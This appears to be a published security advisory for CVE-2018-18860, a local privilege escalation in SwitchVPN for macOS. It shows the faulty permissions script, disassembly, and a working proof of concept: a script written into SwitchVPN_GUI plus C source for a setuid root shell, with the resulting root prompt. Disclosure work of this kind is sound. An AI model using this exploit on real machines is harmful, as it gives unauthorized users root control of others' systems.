@@ -1,0 +1,230 @@
+=======================================================================
+Title: Privilege Escalation Vulnerability
+Product: SwitchVPN for MacOS
+Vulnerable version: 2.1012.03
+CVE ID: CVE-2018-18860
+Impact: Critical
+Homepage: https://switchvpn.net/
+Identified: 2018-09-29
+By: Bernd Leitner (bernd.leitner [at] gmail dot com)
+=======================================================================
+
+Vendor description:
+-------------------
+"By 2015 we were frustrated that the free internet we loved was under
+threat.
+As experts in online security we believed we could solve this problem. So we
+came together as a team to make SwitchVPN, a simple and powerful app to keep
+the internet free. SwitchVPN is simple. Install it on your phone, tablet or
+laptop, then just switch it on to keep the internet free. SwitchVPN is
+powerful.
+Our exclusive VPN Service technology is constantly being upgraded by a
+dedicated
+team of internet security experts."
+
+Source: https://switchvpn.net/
+
+
+Business recommendation:
+------------------------
+By exploiting the vulnerability documented in this advisory, an attacker
+can fully compromise a MacOS system with an installation of the SwitchVPN
+client.
+
+Users are urged to uninstall the SwitchVPN client for MacOS until the
+issues have
+been fixed.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1) Privilege Escalation Vulnerability (reserved CVE-2018-18860)
+
+After installation or an update, the script "fix_permissions.sh" is run by
+the application. This script changes the owner of the main application
+binaries
+to root and sets them to world-writable. Additionally, the SUID bit is set
+for
+another sensitive binary in the application folder. This configuration
+makes it
+very easy to escalate privileges to root.
+
+After the installation or update of SwitchVPN, the following script is run:
+
+============================================================================================
+...
+switchvpn_updater.dat
+mb:MacOS b$ file switchvpn_updater.dat
+switchvpn_updater.dat: Qt Binary Resource file
+...
+if (systemInfo.kernelType === "darwin") {
+  console.log("Run permissions\n");
+  component.addElevatedOperation("Execute",
+"/Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS/fix_permissions.sh");
+}
+...
+============================================================================================
+mb:MacOS b$ cat fix_permissions.sh
+#!/bin/sh
+
+chown -R root /Applications/SwitchVPN/SwitchVPN.app/
+chgrp -R admin /Applications/SwitchVPN/SwitchVPN.app/
+chmod -R 777 /Applications/SwitchVPN/SwitchVPN.app/
+chmod -R u+s /Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS/compose8
+============================================================================================
+
+This leads to an overpermissive application configuration:
+
+============================================================================================
+mb:MacOS b$ ls -al
+total 18720
+drwxrwxrwx  35 root  admin     1120 Sep 29 20:39 .
+drwxrwxrwx  16 root  admin      512 Sep 29 20:39 ..
+-rwxrwxrwx   1 root  admin   106224 Oct 12  2017 SwitchVPN
+-rwxrwxrwx   1 root  admin  4693216 Oct 12  2017 SwitchVPN_GUI
+-r-xr-xr-x   1 root  wheel  2859376 Oct 12  2017 compose
+-r-xr-xr-x   1 root  wheel    29184 Oct 12  2017 compose10
+-r-xr-xr-x   1 root  wheel    29184 Oct 12  2017 compose11
+-r-xr-xr-x   1 root  wheel    59152 Oct 12  2017 compose3
+-r-xr-xr-x   1 root  wheel    39008 Oct 12  2017 compose4
+-r-xr-xr-x   1 root  wheel   587776 Oct 12  2017 compose6
+-r-xr-xr-x   1 root  wheel   278848 Oct 12  2017 compose7
+-r-sr-xr-x   1 root  wheel    22800 Oct 12  2017 compose8
+-r-xr-xr-x   1 root  wheel    19056 Oct 12  2017 compose9
+-r-xr-xr-x   1 root  wheel   132160 Oct 12  2017 composec
+-r-xr-xr-x   1 root  wheel   510464 Oct 12  2017 composecn
+-r-xr-xr-x   1 root  wheel     5632 Oct 12  2017 down.sh
+-rwxrwxrwx   1 root  admin      245 Oct 12  2017 fix_permissions.sh
+-rw-r--r--   1 root  admin       56 Sep 29 20:39 log.txt
+-r-xr-xr-x   1 root  wheel    39050 Oct 12  2017 up.sh
+============================================================================================
+
+Further investigation shows, that the "SwitchVPN_GUI" binary is run as root:
+
+============================================================================================
+mb:MacOS b$ ps aux | grep -i switch
+root             15165   4.6  0.4  4515952  72912   ??  S     8:39PM
+ 0:08.84 SwitchVPN_GUI
+============================================================================================
+
+After statically analysing the "SwitchVPN" binary, it became clear, that it
+runs the "compose8" SUID root binary. Further analysis showed, that
+"compose8"
+subsequently runs the "SwitchVPN_GUI" binary and since it's world-writable,
+an
+attacker can exploit the situation to escalate privileges.
+
+============================================================================================
+# SwitchVPN -> compose8
+...add     rdx, [rdx+10h]
+lea     rsi, aCompose8_0 ; "compose8"
+lea     rcx, aSwitchvpn ; "SwitchVPN"
+xor     r9d, r9d
+xor     eax, eax
+mov     rdi, rbx        ; char *
+mov     r8, r14
+call    _execl
+...
+============================================================================================
+
+============================================================================================
+# compose8 -> SwitchVPN_GUI
+...
+lea     rsi, aCompose8WillIn ; "Compose8 will invoke GUI app %s, %s\n"
+xor     eax, eax
+mov     rdx, rbx
+mov     rcx, r12
+call    _fprintf
+cmp     r15d, 4
+lea     rdx, aB         ; "-b"
+cmovnz  rdx, r14
+xor     ecx, ecx
+xor     eax, eax
+mov     rdi, rbx        ; char *
+mov     rsi, r12        ; char *
+call    _execl
+...
+============================================================================================
+
+Running the "SwitchVPN" binary from the command line confirms the issue:
+
+============================================================================================
+./SwitchVPN
+This app (compose8) invoked with args:
+/Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS, SwitchVPN
+Compose8 will invoke GUI app
+/Applications/SwitchVPN/SwitchVPN.app/Contents/MacOS/SwitchVPN_GUI,
+SwitchVPN_GUI
+============================================================================================
+
+
+Proof of concept:
+-----------------
+1) Privilege Escalation Vulnerability
+A situation like the one described above provides a wide range of
+possibilities for escalating privileges to root. A quick and easy way is to
+write the following shell script to "SwitchVPN_GUI":
+
+============================================================================================
+#!/bin/bash
+chown root /tmp/shell
+chmod 4755 /tmp/shell
+============================================================================================
+
+Create and compile the following execve() based shell:
+
+============================================================================================
+#include <stdlib.h>
+#include <unistd.h>
+main () {
+  setuid(0);
+  seteuid(0);
+  setgid(0);
+  execve("/bin/sh", 0, 0);
+}
+
+gcc shell.c -o shell
+============================================================================================
+
+Copy the shell binary to an attacker controlled location (e.g. /tmp).
+Start the "SwitchVPN.app" as a local, unprivileged user. Afterwards the
+execution of /tmp/shell will drop the user/attacker to a root shell:
+
+============================================================================================
+-rwsr-xr-x   1 root  wheel    8576 Sep 29 20:34 shell
+-rw-r--r--   1 b     wheel     127 Sep 29 20:33 shell.c
+
+bash-3.2$ whoami
+b
+bash-3.2$ ./shell
+bash-3.2# whoami
+root
+============================================================================================
+
+
+Vulnerable / tested versions:
+-----------------------------
+The following version has been tested and found to be vulnerable: 2.1012.03.
+Earlier versions might be vulnerable as well.
+
+
+Vendor contact timeline:
+------------------------
+2018-10-04: Requested security contact via https://switchvpn.net
+2018-10-10: Contacted vendor through mark@switchvpn.com
+2018-10-17: Requested status update from vendor
+2018-10-30: Sent new contact details & public PGP key to mark@switchvpn.com
+2018-10-31: Requested status update from vendor
+2018-11-12: Informed vendor about advisory release
+
+Solution:
+---------
+None.
+
+
+Workaround:
+-----------
+None.
+
+
+EOF B. Leitner / @2018
